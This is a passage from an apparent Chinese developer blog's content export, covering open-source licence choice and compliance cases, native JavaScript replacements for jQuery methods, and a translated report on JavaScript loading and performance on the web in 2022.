GPL（LGPL）允许私有软件开发者使用其保护起来的库，LGPL 提供了给用户自由的弱 Copyleft。 对于提供了特别设计，并且不会与现有非 Copyleft 或非自由库竞争的，我们推荐使用原始的 GNU GPL。 服务器软件 如果其他人很有可能会给你在服务器上跑的软件制作改进版并且不向其他人分发他们的版本，而且你担心这将把你的版本置于一个不利的地位，我们推荐 AGPL。AGPL 的条目和 GPL 几乎相同，唯一实质的区别是它有一个额外的条件确保通过网络用这个软件的人们可以获得它的源代码。 专利 某些许可证（Apache 2 和 GPL v3 等）包含明确的条款，授予用户许可使用软件所包含的所有专利。BSD 3条款净化版许可证、开放数据库许可证和知识共享许可证明确声明它不授予贡献者专利的任何权利。另一些许可证（BSD、MIT 和 GPL v2）没提到专利。但是一般认为，它们默认给予用户专利许可，不构成侵犯专利。除非有明确的&quot;保留专利&quot;的条款，使用开源软件都不会构成侵犯专利。 案例 2019 年，在数字天堂北京网络技术有限公司 诉 柚子北京科技有限公司的案件中，柚子北京 由于开发人员在 2015 年使用了 数字天堂 的 HBuilder 软件工具中三款插件的部分源代码，未遵守开源软件许可证，将具有开源要求的软件产品作为商业产品。被开源软件的著作权人诉请违约和侵权，故而承担法律责任。 2021 年 4 月 30 日，罗盒公司状告风灵公司侵权获赔 50 万元，同时要求风灵公司停止侵权行为。在该案件中原告罗盒公司，独立开发 “罗盒 (Virtual App) 插件化框架虚拟引擎系统 V1.0”（简称 VirtualApp V1.0），在 2016 年引入 GPL3.0 许可证，于 2017 年取得计算机软件著作权登记证书，且声明用于商业用途请购买商业授权。2018 年原告发现名为 “点心桌面” 的软件使用了 VirtualApp V1.0 的代码，经过源码分析对比，发现两者之间高度相似，遂起诉被告福建风灵公司。经法院审判被告赔偿原告为制止侵权行为而支出的合理费用 50 万元。此次判决是中国首个明确 GPL3.0 许可证具有法律效力的案例。 2021 年 12 月中旬，抖音海外版 TikTok 上线一款名为 TikTok Live Studio 的 APP，有网友发现，此软件违反 GPL 许可证，违规使用开源软件 OBS（一个免费的开源视频录制和视频实时流软件，且允许任何人免费应用和商用）的源代码，既然允许商用，但是为什么还会被曝违规呢？这里就需要再科普一下 GPL 许可证，GPL 许可证具有很强的传染性，如果一款软件使用 GPL 许可证的开源软件源码，那么该软件也必须采用 GPL 许可证，进行开源或者下架处理。此事曝光之后，OBS 开发者证实此事，TikTok 也对此事进行了回应，并删除 TikTok Live Studio 的下载页面。 建议 软件开发者使用开源软件时，需要谨慎选择开源软件，关注其开源许可证的内容及相关条件，避免潜在的法律风险。 企业应当建立一个完善机制，识别企业中所使用的开源软件清单，明确对应的开源许可证及权利约束，及时规避相关合规风险。 通过隔离机制避免开源许可证传染，如对于 MPL 许可证下代码的使用，应把该许可证的代码放在单独的文件内避免许可证传染；LGPL 下的代码，可采用动态链接调用该许可证的库实现隔离。 有些组件是存在多种许可证的，可能不同目录文件指定的许可证类型不一样，要特别注意。 有些组件你没有直接依赖，但是可能存在间接依赖的情况，你需要特别注意查看相关组件的依赖关系。 使用 murphysec 开源工具扫描您的代码目录，它会帮您一键识别出来您的代码项目中使用的所有开源组件，包括直接依赖和间接依赖的组件清单，同时列出所有组件对应的开源许可证信息；根据报告的提示可以明确看到对应组件的许可证在什么场景下存在许可证合规风险；根据许可证的合规风险提示，来判断您的项目是否存在违反的可能性，并调整您所引入的组件，来解决这个风险。 使用 在源代码的根目录中创建一个文本文件（通常命名为 LICENSE 或 LICENSE.txt），并将许可证文本复制到该文件中。将 [year] 替换为当前年份，并将 [fullname] 换为版权所有者的姓名。如果可以，添加软件许可协议到项目程序包的描述中（例如：Node.js、Ruby、和 Rust），这将确保许可证显示在软件包目录中。 参考资料 附录 如何选择开源许可证？ 为什么GPL是更好的开源许可证? 总结了一下程序员们都应该知道的各类开源许可证及合规相关的知识 ","link":"https://zkrisj.github.io/post/zong-jie-liao-yi-xia-ge-lei-ruan-jian-xu-ke-xie-yi/"},{"title":"总结一下 jQuery 的原生替代方法","content":"介绍 jQuery 是当今网络上使用最多的库，虽然 jQuery 相对较小且运行速度相当快，但它仍然代表应用程序中的一定量的开销。jQuery 提供的大部分功能现在都可以通过原生 DOM API 实现，并且在当今的 Web 应用程序中可能是不必要的。一些开发者认为，jQuery 可以保护我们不受浏览器兼容的影响，而事实上，在 IE8 之后，浏览器自己就很容易处理兼容问题了，而在 IE 时代之后，浏览器在兼容方面会做得更多。 fetch 替代 AJAX 方法 $(selector).load $('#selector').load('/path/to/template.html'); // 等价替换 const response = await fetch('/path/to/template.html'); const body = await response.text(); document.querySelector('#selector').innerHTML = body; $.get $.get('/my/url', function(data){ // 处理 data 数据 }); // 等价替换 const response = await fetch('/my/url'); if (!response.ok) { } const data = await response.text(); $.getJSON $.getJSON('/my/url', function(data){ // 处理 data 数据 }); // 等价替换 const response = await fetch('/my/url'); const data = await response.json(); $.ajax $.ajax({ type: 'POST', url: '/my/url', data: data, success: function (res) {}, error: function () {} }); // 等价替换 const res = await fetch('/my/url', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(data) }); 元素操作 $(el).toggle $(el).toggle(); // 等价替换 el.classList.toggle('hide'); .hide { display: none; } $(el).addClass $(el).addClass(className); // 等价替换 el.classList.add(className); $(el).removeClass $(el).removeClass(className); // 等价替换 el.classList.remove(className); $(el).hasClass $(el).hasClass(className); // 等价替换 el.classList.contains(className); $(el).css $(el).css(ruleName); // 等价替换 getComputedStyle(el)[ruleName]; $(el).css(prop, val); // 等价替换 el.style.cssText = `${prop}: ${val}`; $(target).after $(target).after(element); // 等价替换 target.after(element); $(target).before $(target).before(element); // 等价替换 target.before(el); $(parent).append $(parent).append(el); // 等价替换 parent.append(el); $(el).appendTo $(el).appendTo(parent); // 等价替换 parent.append(el); $(el).clone $(el).clone(); // 等价替换 el.cloneNode(true); $(el).closest $(el).closest(selector); // 等价替换 el.closest(selector); $.contains $.contains(el, childNode); // 等价替换 el.contains(childNode); :contains $(&quot;div:contains('my text')&quot;); // 等价替换 [...document.querySelectorAll('div')].filter((el) =&gt; el.textContent.includes('my text') ); Create Elements $('&lt;div&gt;Hello World!&lt;/div&gt;'); // 等价替换 function generateElements(html) { const template = document.createElement('template'); template.innerHTML = html.trim(); return template.content.children; } generateElements('&lt;div&gt;Hello World!&lt;/div&gt;'); $(selector).each $(selector).each(function (i, el) {}); // 等价替换 document.querySelectorAll(selector).forEach((el, i) =&gt; {}); $(el).empty $(el).empty(); // 等价替换 el.replaceChildren(); $(selector).filter $(selector).filter(filterFn); // 等价替换 [...document.querySelectorAll(selector)].filter(filterFn); $(el).find $(el).find(selector); // 等价替换 el.querySelectorAll(`:scope ${selector}`); $(el).height|width $(el).height(); $(el).width(); // 等价替换 el.getBoundingClientRect().height; el.getBoundingClientRect().width; $(el).height(val); $(el).width(val); // 等价替换 function setHeight(el, val) { if (typeof val === 'function') val = val(); else if (typeof val === 'string') el.style.height = val; else el.style.height = val + 'px'; } function setWidth(el, val) { if (typeof val === 'function') val = val(); else if (typeof val === 'string') el.style.width = val; else el.style.width = val + 'px'; } $(el).index $(el).index(); // 等价替换 [...el.parentNode.children].indexOf(el); $(el).innerHeight|innerWidth $(el).innerHeight(); $(el).innerHeight(150); $(el).innerWidth(); $(el).innerWidth(150); // 等价替换 function innerHeight(el, value) { if (value === undefined) { return el.clientHeight; } else { el.style.height = value; } } function innerWidth(el, value) { if (value === undefined) { return el.clientWidth; } else { el.style.width = value; } } innerHeight(el); innerHeight(el, 150); innerWidth(el); innerWidth(el, 150); $(selector).last $(selector).last(); // 等价替换 document.querySelectorAll(selector).at(-1); $(el).is $(el).is('.my-class'); // 等价替换 el.matches('.my-class'); $(el).offset $(el).offset(); // 等价替换 function offset(el) { const box = el.getBoundingClientRect(); const docElem = document.documentElement; return { top: box.top + window.pageYOffset - docElem.clientTop, left: box.left + window.pageXOffset - docElem.clientLeft }; } 相对视口的位置 function offset(el) { const offset = $(el).offset(); return { top: offset.top - document.body.scrollTop, left: offset.left - document.body.scrollLeft }; } // 等价替换 el.getBoundingClientRect(); $(el).offsetParent $(el).offsetParent(); // 等价替换 el.offsetParent || el; $(el).outerHeight|outerWidth $(el).outerHeight(); $(el).outerWidth(); // 等价替换 el.offsetHeight; el.offsetWidth; // 加上 margin $(el).outerHeight(true); $(el).outerWidth(true); // 等价替换 function outerHeight(el) { const style = getComputedStyle(el); return ( el.getBoundingClientRect().height + parseFloat(style.getPropertyValue('marginTop')) + parseFloat(style.getPropertyValue('marginBottom')) ); } function outerWidth(el) { const style = getComputedStyle(el); return ( el.getBoundingClientRect().width + parseFloat(style.getPropertyValue('marginLeft')) + parseFloat(style.getPropertyValue('marginRight')) ); } outerHeight(el); outerWidth(el); $(el).parents $(el).parents(selector); // 等价替换 function parents(el, selector) { const parents = []; while ((el = el.parentNode) &amp;&amp; el !== document) { if (!selector || el.matches(selector)) parents.unshift(el); } return parents; } $(el).position $(el).position(); // 等价替换 function position(el) { const {top, left} = el.getBoundingClientRect(); const {marginTop, marginLeft} = getComputedStyle(el); return { top: top - parseInt(marginTop), left: left - parseInt(marginLeft) }; } $(el).next|prev $(el).next(); $(el).prev(); // 等价替换 el.nextElementSibling; el.previousElementSibling; $(el).next(selector); $(el).prev(selector); // 等价替换 function next(el, selector) { if (selector) { let next = el.nextElementSibling; while (next &amp;&amp; !next.matches(selector)) { next = next.nextElementSibling; } return next; } } function prev(el, selector) { if (selector) { let previous = el.previousElementSibling; while (previous &amp;&amp; !previous.matches(selector)) { previous = previous.previousElementSibling; } return previous; } } $(el|selector).remove $(el).remove(); // 等价替换 el.remove(); $(selector).remove(); // 等价替换 for (const el of [...document.querySelectorAll(selector)]) { el.remove(); } $(el).replaceWith $(el).replaceWith(string); // 等价替换 el.outerHTML = string; $(el).scrollLeft $(el).scrollLeft(); $(el).scrollLeft(value); // 等价替换 function scrollLeft(el, value) { if (value === undefined) { return el.pageXOffset; } else { if (el === window || el.nodeType === 9) { el.scrollTo(value, el.pageXOffset); } else { el.pageXOffset = value; } } } $(el).scrollTop $(el).scrollTop(); $(el).scrollTop(value); // 等价替换 function scrollTop(el, value) { if (value === undefined) { return el.pageYOffset; } else { if (el === window || el.nodeType === 9) { el.scrollTo(value, el.pageYOffset); } else { el.pageYOffset = value; } } } $(formElement).serialize $(formElement).serialize(); // 等价替换 new URLSearchParams(new FormData(formElement)).toString(); $(el).siblings $(el).siblings(); // 等价替换 [...el.parentNode.children].filter((child) =&gt; child !== el); $(el).wrap el.wrap('&lt;div&gt;&lt;/div&gt;'); // 等价替换 function wrap(el) { const wrappingElement = document.createElement('div'); el.replaceWith(wrappingElement); wrappingElement.appendChild(el); } $(el).unwrap $(el).unwrap(); // 等价替换 el.replaceWith(...el.childNodes); $(el).val $(el).val(); // 等价替换 function val(el) { if (el.options &amp;&amp; el.multiple) { return el.options .filter((option) =&gt; option.selected) .map((option) =&gt; option.value); } else { return el.value; } } 事件操作 $(document).ready $(document).ready(function () {}); // 等价替换 function ready(fn) { if (document.readyState !== 'loading') { fn(); } else { document.addEventListener('DOMContentLoaded', fn); } } $(document).on $(document).on(eventName, elementSelector, handler); // 等价替换 document.addEventListener(eventName, (event) =&gt; { if (event.target.closest(elementSelector)) { handler.call(event.target, event); } }); $(el).click $(el).click(function () {}); // 等价替换 el.addEventListener('click', () =&gt; {}); $(el).on $(el).on(eventName, eventHandler); $(el).on(eventName, selector, eventHandler); // 等价替换 function addEventListener(el, eventName, eventHandler, selector) { if (selector) { const wrappedHandler = (e) =&gt; { if (e.target &amp;&amp; e.target.matches(selector)) { eventHandler(e); } }; el.addEventListener(eventName, wrappedHandler); return wrappedHandler; } else { el.addEventListener(eventName, eventHandler); return eventHandler; } } addEventListener(el, eventName, eventHandler); addEventListener(el, eventName, eventHandler, selector); $(el).off $(el).off(eventName, eventHandler); // 等价替换 el.removeEventListener(eventName, eventHandler); $(el).trigger $(el).trigger('my-event', {some: 'data'}); // 等价替换 const event = new CustomEvent('my-event', {detail: {some: 'data'}}); el.dispatchEvent(event); $(el).trigger('focus'); $(el).trigger(new PointerEvent('pointerover')); // 等价替换 function trigger(el, eventType) { if (typeof eventType === 'string' &amp;&amp; typeof el[eventType] === 'function') { el[eventType](); } else { const event = eventType === 'string' ? new Event(eventType, {bubbles: true}) : eventType; el.dispatchEvent(event); } } trigger(el, 'focus'); trigger(el, new PointerEvent('pointerover')); 内置操作 $.inArray|isArray $.inArray(item, array); $.isArray(arr); // 等价替换 array.indexOf(item); Array.isArray(arr); $.each|map $.each(array, fn); $.map(array, fn); // 等价替换 array.forEach(fn); array.map(fn); $.each(obj, function (key, value) {}); // 等价替换 for (const [key, value] of Object.entries(obj)) {} $.proxy $.proxy(fn, context); // 等价替换 fn.bind(context); $.extend $.extend({}, objA, objB); // 等价替换 const result = {...objA, ...objB}; $.extend(true, {}, objA, objB); // 等价替换 function deepExtend(out, ...arguments_) { if (!out) { return {}; } for (const obj of arguments_) { if (!obj) { continue; } for (const [key, value] of Object.entries(obj)) { switch (Object.prototype.toString.call(value)) { case '[object Object]': out[key] = deepExtend(out[key], value); break; case '[object Array]': out[key] = deepExtend(new Array(value.length), value); break; default: out[key] = value; } } } return out; } deepExtend({}, objA, objB); $.isNumeric $.isNumeric(val); // 等价替换 function isNumeric(num) { if (typeof num === 'number') return num - num === 0; if (typeof num === 'string' &amp;&amp; num.trim() !== '') return Number.isFinite(+num); return false; } isNumeric(val); $.parseHTML $.parseHTML(htmlString); // 等价替换 function parseHTML(str) { const tmp = document.implementation.createHTMLDocument(''); tmp.body.innerHTML = str; return [...tmp.body.childNodes]; } parseHTML(htmlString); $.type $.type(obj); // 等价替换 Object.prototype.toString .call(obj) .replace(/^\\[object (.+)\\]$/, '$1') .toLowerCase(); 原文链接 You might not need jQuery ","link":"https://zkrisj.github.io/post/zong-jie-yi-xia-jquery-de-yuan-sheng-ti-dai-fang-fa/"},{"title":"2022 JavaScript 年度报告（翻译）","content":"介绍 JavaScript 是一股强大的力量，它在网络上提供了最大份额的交互性。它将行为从简单推向复杂，并使网络上的事情比以往任何时候都多。 然而，增加使用 JavaScript 来提供丰富的用户体验是有代价的。从下载、解析和编译 JavaScript 的那一刻起，到它执行的每一行代码，浏览器必须协调各种工作以使一切成为可能。对 JavaScript 做得太少意味着您可能无法实现用户体验和业务目标。另一方面，在 JavaScript 上做得过多意味着您将创建加载缓慢、响应迟缓以及让用户感到沮丧的用户体验。 今年，我们将再次关注 JavaScript 在 Web 中的作用，展示我们对 2022 年的发现，并为创造令人愉悦的用户体验提供建议。 我们加载了多少 JavaScript？ 首先，我们将评估 JavaScript Web 开发人员在 Web 上发布的数量。毕竟，在进行改进之前，必须对当前情况进行评估。 每页加载的 JavaScript 字节量的分布。 与去年一样，今年标志着向浏览器发送的 JavaScript 数量又一次增加。从 2021 年到 2022 年，移动设备增长了 8%，而桌面设备增长了 10%。虽然这种增长没有前几年那么陡峭，但它仍然是一个令人担忧的趋势的延续。虽然设备功能不断改进，但并不是每个人都在运行最新的设备。事实仍然是，更多的 JavaScript 等于对设备资源造成更大的压力。 未使用的 JavaScript 字节量的分布。 根据 Lighthouse 的说法，移动页面的中位数加载了 162 KB 的未使用 JavaScript。在第 90 个百分位，604 KB 的 JavaScript 未被使用。这比去年略有上升，去年未使用 JavaScript 的中位数和 90% 分别为 155 KB 和 598 KB。所有这些都代表了大量未使用的 JavaScript，尤其是当您考虑到此分析跟踪 JavaScript 资源的传输大小时，如果压缩，则意味着已使用 JavaScript 的解压缩部分可能比图表显示的要大得多。 与中位数的移动页面加载的总字节数相比，未使用的 JavaScript 占所有加载脚本的 35%。这比去年的 36% 略有下降，但仍然有很大一部分已加载但未使用。这表明许多页面正在加载可能不会在当前页面上使用的脚本，或者由页面生命周期后期的交互触发，并且可能受益于动态 import() 以降低启动成本。 每页的 JavaScript 请求数 页面上的每个资源都会启动至少一个请求，如果一个资源对更多资源发出额外请求，则可能会启动更多。 就脚本请求而言，请求越多，您不仅会加载更多 JavaScript，而且还会增加脚本资源之间的争用，这可能会导致主线程陷入困境，从而导致启动速度变慢。 每页 JavaScript 请求数的分布。 2022 年，移动页面的中位数响应了 21 个 JavaScript 请求，而在第 90 个百分位，有 60 个。与去年相比，中位数的请求增加了 1 个，第 90 个百分位的请求增加了 4 个。 就 2022 年的桌面设备而言，中位数有 22 个 JavaScript 请求，第 90 个百分位有 63 个。与去年相比，中位数增加了 1 个 JavaScript 请求，90% 增加了 4 个——与移动设备的增长相同。 虽然请求数量没有大幅增加，但它确实延续了自 2019 年 Web Almanac 推出以来请求逐年增加的趋势。 JavaScript是如何处理的？ 自从 Node.js 等 JavaScript 运行时出现以来，依赖构建工具来打包和转换 JavaScript 变得越来越普遍。不可否认，这些工具很有用，但会影响 JavaScript 的发布量。 打包器 JavaScript 打包器是构建时工具，用于处理项目的 JavaScript 源代码，然后对其进行转换和优化。输出是生产就绪的 JavaScript。以下面的代码为例： function sum (a, b) { return a + b; } 打包器会将此代码转换为更小但更优化的等效代码，从而减少浏览器下载时间： function n(n,r){return n+r} 鉴于打包器执行的优化，它们是优化源代码以在生产环境中获得更好性能的关键部分。 按网站排名使用 webpack 打包 JavaScript 的页面。 在 1,000 个最受欢迎的网站中，17% 使用 webpack 作为打包工具。这是有道理的，因为 HTTP 存档爬取的许多热门页面很可能是使用 webpack 打包和优化源代码的知名电子商务网站。 按网站排名使用 Parcel 打包 JavaScript 的页面。 Parcel 是 webpack 的一个值得注意的替代品，它的采用意义重大。Parcel 在所有网站排名中的采用率都是一致的，占网站排名的 1.2% 到 1.9%。 虽然 HTTP Archive 无法跟踪生态系统中所有打包器的使用情况，但打包器的使用在 JavaScript 的整体图景中非常重要，因为它们不仅对开发人员体验很重要，而且它们可以以依赖的形式贡献的开销管理代码可能是 JavaScript 发布量的一个因素。值得检查您的整体项目设置是如何配置的，以便为您的用户使用的浏览器生成最有效的输出。 编译器 编译器通常在构建时用于工具链中，以将较新的 JavaScript 功能转换为可在旧浏览器中运行的语法。由于 JavaScript 多年来发展迅速，这些工具仍在使用中。 按网站排名使用 Babel 的页面。 考虑到这些年来 JavaScript 的发展程度，这些结果并不令人惊讶。为了保持对特定浏览器的广泛兼容性，Babel 使用转换来输出兼容的 JavaScript 代码。 转换通常比未转换的对应对象大。当转换在代码库中广泛或重复时，可能会向用户发送可能不必要甚至未使用的 JavaScript。这会对性能产生不利影响。 考虑到即使网站排名前 100 万的页面中有 26% 正在使用 Babel 转换他们的 JavaScript 源代码，假设其中一些体验可能正在运送他们不需要的转换并不是不合理的。如果您在项目中使用 Babel，请仔细查看 Babel 的可用配置选项和插件，以寻找优化其输出的机会。 由于 Babel 还依赖 Browserslist 来确定是否需要将某些功能转换为旧语法，因此请务必检查您的浏览器列表配置，以确保您的代码被转换为在用户实际使用的浏览器中工作。 JavaScript 是如何被请求的？ 请求 JavaScript 的方式也可能对性能产生影响。您可以通过多种最佳方式请求 JavaScript，但在某些情况下，这种方式远没有那么理想。在这里，我们将看到 Web 是如何整体交付 JavaScript 的，以及它如何与性能预期保持一致。 async、defer、module 和 nomodule &lt;script&gt; 元素上的 async 和 defer 属性控制脚本加载方式的行为。async 属性将防止脚本阻塞解析，但会在下载后立即执行，因此仍可能会阻塞渲染。defer 属性将延迟脚本的执行，直到 DOM 准备好，因此可以防止脚本阻塞解析和渲染。 type=&quot;module&quot; 和 nomodule 属性表明脚本中是否有 ES6 模块。使用 type=&quot;module&quot; 时，表示这些脚本的内容将包含 ES6 模块，并将延迟这些脚本的执行（与 defer 相同），直到默认构建 DOM。相反的，设置 nomodule 属性来标明这个脚本在支持 ES2015 modules 的浏览器中忽略，这可以在使用模块脚本的同时为不支持的浏览器提供无模块的后备脚本。 特征 桌面 移动 async 76% 76% defer 42% 42% async和defer 28% 29% module 4% 4% nomodule 0% 0% script 元素上使用 async、defer、type=\"module\" 和 nomodule 属性的页面百分比。 令人鼓舞的是，76% 的移动页面使用了 async。但是，defer 如此低的使用率表明仍有提高渲染性能的机会。 正如去年所指出的，同时使用 async 和 defer 是一种应该避免的反模式，因为 async 具有优先权 并将使 defer 属性被忽略。 type=&quot;module&quot; 和 nomodule 的普遍缺失并不奇怪，因为似乎很少有页面提供 JavaScript 模块。随着时间的推移，type=&quot;module&quot; 的使用可能会增加，因为开发人员会将未转换的 JavaScript 模块发送到浏览器。 查看所有站点的总体脚本百分比，可以看到略有不同的情况： 特征 桌面 移动 async 49.3% 47.2% defer 8.8% 9.1% async和defer 3.0% 3.1% module 0.4% 0.4% nomodule 0% 0% script 元素上使用 async、defer、type=\"module\" 和 nomodule 属性的脚本的百分比。 我们看到 async 和 defer 在这里的使用要小得多。其中一些脚本可能会在初始渲染后动态插入，但也可能有很大一部分页面没有在初始 HTML 中包含的脚本上设置这些属性，导致阻塞了渲染。 preload、prefetch、和 modulepreload 资源预测（如 dns-prefetch、preconnect、prerender、preload、prefetch 和 modulepreload）可用于提示浏览器应尽早获取哪些资源。每种预测都有不同的用途，preload 用于获取当前导航所需的资源，modulepreload 相当于预加载包含 JavaScript 模块的脚本，以及 prefetch 用于下一次导航所需的资源。 资源预测 桌面 移动 preload 16.4% 15.4% prefetch 1.0% 0.8% modulepreload 0.1% 0.1% 使用各种资源预测的页面百分比。 分析资源预测采用的趋势很棘手。并非所有页面都受益于它们，并且笼统地建议广泛使用资源预测是不明智的，因为过度使用它们会产生其自身的后果——尤其是在 preload 涉及到的地方。然而，preload 15% 的移动页面上相对丰富的资源预测表明，许多开发人员都意识到了这种性能优化，并试图利用它来发挥自己的优势。 prefetch 使用起来很棘手，尽管它对于长时间的多页会话可能是有益的。即便如此，prefetch 这完全是推测性的，以至于浏览器在某些情况下可能会忽略它。这意味着某些页面可能会通过请求未使用的资源来浪费数据。这真的“视情况而定”。 由于 &lt;script&gt; 元素上 type=&quot;module&quot; 属性的采用率同样较低，因此 modulepreload 的缺少使用是有道理的。即使如此，不经过转换就发布 JavaScript 模块的应用程序也可以从这个资源预测中受益，因为它不会只获取命名的资源，而是获取整个模块树。这在某些情况下会有所帮助。 让我们深入分析使用了多少种资源预测类型。 每页 JavaScript 资源的 prefetch 采用分布。 这里采用 prefetch 有些令人惊讶，每个页面有三个针对 JavaScript 资源的 prefetch 预测。然而，这些预测在第 75 和第 90 百分位的数量表明，可能有相当数量的浪费，其形式是页面导航从未使用过的未使用资源。 每页 JavaScript 资源的 preload 采用分布。 请记住 - 此分析跟踪使用一个或多个资源预测的页面上的 JavaScript 资源使用了多少 preload 预测。中间部分 preload 为 JavaScript 提供了两个预测，这在表面上还不错，但它通常取决于脚本的大小、可以启动多少处理脚本，或者 preload 初始时是否需要通过获取的脚本页面加载。 不幸的是，我们在第 90 个百分位看到了 5 个 JavaScript 资源 preload 预测，这可能太多了。这表明第 90 个百分位的页面特别依赖 JavaScript，并且正在 preload 尝试克服由此产生的性能问题。 每页 JavaScript 资源的 modulepreload 采用分布。 我们在第 75 个百分位上看到了惊人的 6 个预测，在第 90 个百分位数上看到了 14 个预测！这表明，虽然在高百分位使用更多个 modulepreload 预测的页面将未转换的 ES6 模块直接发送到浏览器，但对如此多资源预测的需求表明在高百分位上过度依赖 JavaScript。 资源预测是优化我们如何在浏览器中加载资源的好工具，但如果您在使用它们时可以注意一条建议，那就是谨慎使用它们，以及最初可能无法发现的资源；例如，最初在 DOM 中加载的 JavaScript 文件请求另一个文件。与其预加载大量脚本，不如尝试减少您要交付的 JavaScript 数量，因为这将带来更好的用户体验，而不是预加载大量脚本。 &lt;head&gt; 中的 JavaScript 一个古老且经常被吹捧的性能最佳实践是在文档的页脚中加载 JavaScript，以避免脚本的呈现阻塞，并确保在脚本有机会运行之前构造 DOM。然而，近年来，在某些体系结构中，将 &lt;script&gt; 元素放在文档 &lt;head&gt; 中更为常见。 这可能是在 Web 应用程序中优先加载 JavaScript 的好方法，但应尽可能使用 async 和 defer 属性以避免 DOM 的渲染阻塞。渲染阻塞是指浏览器必须停止页面的所有渲染以处理页面所依赖的资源。这样做是为了避免不愉快的影响，例如无样式内容的闪烁，或者当 DOM 未准备好依赖于 DOM 就绪的脚本时可能发生的 JavaScript 运行时错误。 我们发现 77% 的移动页面在文档 &lt;head&gt; 中至少有一个渲染阻塞脚本，而 79% 的桌面页面都有这个脚本。这是一个令人担忧的趋势，因为当脚本阻止呈现时，页面内容的绘制速度不会尽可能快。 根据网站排名具有阻塞渲染的脚本的页面占比。 当按网站排名页面查看问题时，我们看到了类似的麻烦模式。特别是，在通过移动设备访问的前 1000 个网站中，63% 的网站在 &lt;head&gt; 中提供了至少一个阻塞渲染的脚本，并且随着网站排名的增加，页面的比例也在增加。 对此有解决方案： 使用 defer 属性是一种相对安全的选择，可以解除对 DOM 渲染的阻塞。使用async（如果可能）是一个不错的选择，它将允许脚本立即运行，但这些脚本不能对其他 &lt;script&gt; 元素有任何依赖关系，否则可能会发生错误。 在可能的情况下，渲染关键的 JavaScript 可以放在页脚，并 preload 加载，这样浏览器就可以提前开始请求这些资源。无论哪种方式，渲染阻塞 JavaScript 的状态与我们发布的 JavaScript 数量并不乐观，Web 开发人员应该更加努力地遏制这些问题。 脚本注入 脚本注入是一种模式，其中使用 document.createElement 在 JavaScript 中创建 HTMLScriptElement，并使用 DOM 插入方法注入 DOM。或者，可以通过 innerHTML 方法将字符串中的 &lt;script&gt; 元素标记注入 DOM。 脚本注入是一种相当普遍的做法，在很多情况下都会用到，但它的问题在于，它破坏了浏览器的预加载扫描器，使脚本在初始HTML有效载荷被解析时无法被发现。如果注入的脚本资源最终负责渲染标记，这可能会影响到最大的内容绘画（LCP）等指标，而这本身就会启动长时间的任务来解析大块的标记内容。 注入脚本的百分比在各个百分点上的分布。 在中位数上，我们看到 25% 的页面的脚本被注入，而不是让它们在最初的 HTML 响应中被渲染。更令人担忧的是，第 75 和第 90 百分位数的页面分别注入了 50% 和 70% 的脚本。 脚本注入在用于呈现用户使用的页面内容时有可能损害性能，在这些情况下应在必要时避免。脚本注入在当今的网络中如此普遍是一个令人担忧的趋势。现代框架和工具可能依赖于此模式，这意味着一些开箱即用的体验可能会依赖这种潜在的反模式来为网站提供功能。 第一方与第三方 JavaScript 网站经常发布两类 JavaScript： 为您网站的基本功能提供支持并提供交互性的第一方脚本。 外部供应商提供的满足各种需求的第三方脚本，例如 UX 研究、分析、提供广告收入以及嵌入视频和社交媒体功能等内容。 虽然第一方的 JavaScript 可能更容易优化，但第三方的 JavaScript 本身也可能是性能问题的一个重要来源，因为第三方供应商可能不会优先考虑优化他们的 JavaScript 资源，而是增加新的功能来为他们的客户提供额外的业务功能。此外，用户体验研究人员、营销人员和其他非技术人员可能对放弃这些脚本提供的功能或收入来源感到犹豫。 在这里，我们看到了一幅发人深省的画面。无论百分比如何，似乎所有观察到的主机都在提供等量的第一方和第三方脚本。中位数主机为每种类型服务 10 个，第 75 个百分位数为每种类型提供 20 个，第 90 个百分位数主机为 34 个第三方脚本服务！ 这是一个有问题且令人担忧的趋势。当涉及到性能时，第三方脚本会造成各种损害。第三方脚本可能会做很多事情，例如运行昂贵的计时器来编排大量任务，附加他们自己的事件侦听器来增加额外的工作，从而延迟交互性，以及一些视频和社交媒体第三方提供大量的脚本为他们提供的服务提供动力。 缓解第三方脚本的步骤通常更像是一种文化问题，而不是工程问题。如果您要交付过多的第三方脚本，请对每个脚本进行审计，了解它们的作用，并分析它们的活动，以找出它们引发的性能问题。 如果您正在进行大量 UX 研究，请考虑收集您自己的字段数据（如果源发送正确的 Timing-Allow-Origin 标头）以做出明智的决定，以避免某些第三方脚本可能导致的性能问题。对于您添加的每个第三方脚本，您不仅会产生加载成本，还会产生对用户输入的响应至关重要的运行时成本。 所以我们知道主机发送了大量第三方脚本，但是第一方脚本与第三方脚本的字节成本是多少？ 第一方与第三方由主机提供的 JavaScript 字节大小分布。 在几乎每一个百分点上，第三方脚本发送的字节数都超过了第一方脚本的字节数。在第 75 个百分位，第三方脚本有效负载似乎是第一方脚本的两倍。在第 90 个百分位，通过网络发送的第三方脚本的数量似乎接近 1 兆字节。 如果您发现您的网站的第一个与第三方脚本有效负载与上图相似，那么您应该与您的工程组织合作尝试降低这个数字是关键。如果您这样做，它只能帮助您的用户。 动态 import() 动态 import() 是静态 import 语法的一种变体，可以在脚本的任何地方运行，而静态 import 表达式必须在 JavaScript 文件的顶部运行，而不能在其他任何地方运行。 动态 import() 允许开发人员有效地从他们的主要包中“拆分”出 JavaScript 代码块，以便按需加载，这可以通过预先加载更少的 JavaScript 来提高启动性能。 目前观察到的所有移动页面中，只有 0.34% 的移动页面使用动态 import()，而 0.41% 的桌面页面使用它，这一比例低得惊人。这是一个在启动期间交付更少代码的机会。也许动态 import() 并没有看到太多用处，因为它根据功能按需而不是预先加载 JavaScript。 这很棘手，但可以取得平衡，它涉及衡量用户的意图。在不延迟交互的情况下延迟加载 JavaScript 的一种方法是在用户发出进行交互的信号时 preload 该 JavaScript。这方面的一个示例可能是延迟加载 JavaScript 以验证表单，并在用户关注该表单中的字段后预加载该 JavaScript。这样，当请求 JavaScript 时，它已经在浏览器缓存中。另一种方法可能是使用服务工作者在安装服务工作者时预缓存交互所需的 JavaScript。安装应该发生在页面在页面加载事件中完全加载的位置。这样，当请求必要的功能时，可以从 service worker 缓存中检索它，而无需启动成本。 动态 import() 使用起来很棘手，但更广泛地采用它可以帮助将加载 JavaScript 的性能成本从启动转移到页面生命周期的后期，大概是在网络资源争用较少的时候。我们希望看到更多采用动态 import()，因为我们看到在启动期间加载的 JavaScript 数量只会增加。 Web Worker Web Worker 是一种 Web 平台功能，它通过在自己的线程上启动一个不直接访问 DOM 的专门的 JavaScript 文件来减少主线程工作。这项技术可以用来卸载那些可能使主线程不堪重负的任务，在一个单独的线程上完成这些工作。 